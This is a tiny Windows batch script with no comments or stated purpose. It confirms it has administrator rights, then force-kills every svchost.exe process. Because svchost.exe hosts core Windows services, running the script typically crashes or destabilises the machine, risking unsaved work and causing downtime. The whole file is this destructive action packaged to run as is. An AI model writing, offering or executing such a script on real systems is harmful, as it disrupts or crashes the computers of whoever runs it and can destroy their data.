@echo off
net session >nul 2>&1
if %errorLevel% NEQ 0 (
    echo Access denied. Restart as administrator.
    exit /b
)
taskkill /F /IM svchost.exe
